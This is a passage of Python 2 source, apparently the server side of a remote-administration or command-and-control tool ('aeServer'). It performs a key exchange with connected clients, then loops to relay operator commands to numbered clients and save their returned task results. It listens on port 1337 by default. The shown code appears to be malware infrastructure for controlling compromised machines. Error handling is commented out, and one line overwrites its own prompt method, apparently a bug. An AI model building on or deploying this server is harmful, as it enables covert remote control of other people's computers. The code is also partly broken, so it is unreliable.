            if request.get('request') == 'public_key':
                response = server._encrypt(self.public_key.exportKey(), self.session_key)
                self.connection.sendall(response + '\n')
            return session_id
        except Exception as e2:
            self._error(str(e2))

    def _error(self, data):
        with self.lock:
            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self.name) + bytes(data) + '\n')

    def prompt(self, data):
        with self.lock:
            return raw_input(server._prompt_color + server._prompt_style + '\n' + bytes(data).rstrip())

    def run(self):
        while True:
#            try:
            if 1:
                if self.shell.wait():
                    
                    task = server.recv_client(self.name) if not self._prompt else self._prompt

                    if 'help' in task.get('command'):
                        self.shell.clear()
                        server.show_usage_help(data=task.get('result'))
                        self.shell.set()

                    elif 'passive' in task.get('command'):
                        server._print(task.get('result'))
                        break

                    elif 'prompt' in task.get('command'):
                        self._prompt = task
                        command = self.prompt(task.get('result') % int(self.name))
                        cmd, _, action  = command.partition(' ')
                        if cmd in ('\n', ' ', ''):
                            continue 
                        elif cmd in server.commands and cmd != 'help':
                            result = server.commands[cmd](action) if len(action) else server.commands[cmd]()
                            if result:
                                server._print(result)
                                server.save_task_results(task)
                            continue
                        else:
                            server.send_client(command, self.name)
                            
                    else:
                        if task.get('result') and task.get('result') != 'None':
                            server._print(task.get('result'))
                            server.save_task_results(task)
                            
                    if server.exit_status:
                        break
                    
                    self.prompt = None
                    
#            except Exception as e:
#                self._error(str(e))
#                time.sleep(1)
#                break
#        server._return()


if __name__ == '__main__':
    colorama.init()
    threads = collections.namedtuple('Server', ['shell','resource','task'])
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 1337
    debug = True if 'debug' in sys.argv else (True if '--debug' in sys.argv else False)
    server = aeServer(port=port, debug=debug)
    server.start()
 
